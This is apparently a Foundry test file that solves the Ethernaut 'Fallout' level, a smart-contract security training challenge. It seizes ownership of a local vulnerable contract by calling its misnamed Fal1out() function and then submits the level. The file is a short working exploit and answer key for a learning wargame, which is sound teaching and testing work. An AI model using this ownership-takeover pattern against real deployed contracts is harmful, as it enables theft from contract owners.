// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "src/core/Ethernaut-06.sol";
import "src/levels/02-Fallout/FalloutFactory.sol";

contract FalloutTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address hacker = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();
    }

    function testFalloutHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        FalloutFactory falloutFactory = new FalloutFactory();
        ethernaut.registerLevel(falloutFactory);
        vm.startPrank(hacker);
        address levelAddress = ethernaut.createLevelInstance(falloutFactory);
        Fallout ethernautFallout = Fallout(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        emit log_named_address("hacker address", hacker);
        emit log_named_address("the owner of the victim contract before exploit", ethernautFallout.owner());
        ethernautFallout.Fal1out();
        emit log_named_address("the owner of the victim contract after exploit", ethernautFallout.owner());
        assertEq(ethernautFallout.owner(), hacker);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}